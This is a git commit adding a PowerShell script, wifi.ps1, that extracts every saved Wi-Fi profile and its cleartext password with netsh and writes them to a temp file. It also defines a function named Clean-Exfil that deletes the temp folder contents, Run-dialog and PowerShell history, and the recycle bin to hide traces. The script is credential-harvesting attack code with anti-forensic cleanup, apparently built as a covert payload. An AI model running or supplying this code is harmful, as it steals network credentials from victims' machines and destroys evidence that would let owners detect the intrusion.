7e47db61adc698ed0f443b56a53becb1ec0f5fe4
DJerryD <103631920+DJerryD@users.noreply.github.com>
2023-06-30 13:26:20 +0800

    Add PowerShell script

---
+++ wifi.ps1
@@ -0,0 +1,32 @@
+$wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | ForEach-Object {
+    $name = $_.Matches.Groups[1].Value.Trim()
+    $_ | Out-Null
+    (netsh wlan show profile name="$name" key=clear)
+} | Select-String "Key Content\W+\:(.+)$" | ForEach-Object {
+    $pass = $_.Matches.Groups[1].Value.Trim()
+    $_ | Out-Null
+    [PSCustomObject]@{
+        PROFILE_NAME = $name
+        PASSWORD = $pass
+    }
+} | Format-Table -AutoSize | Out-String
+
+$wifiProfiles | Out-File -FilePath $env:TEMP/--wifi-pass.txt
+
+function Clean-Exfil {
+    # 清空临时文件夹
+    rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
+
+    # 删除运行框历史记录
+    reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+
+    # 删除 PowerShell 历史记录
+    Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue
+
+    # 清空回收站
+    Clear-RecycleBin -Force -ErrorAction SilentlyContinue
+}
+
+if (-not ([string]::IsNullOrEmpty($ce))) {
+    Clean-Exfil
+}
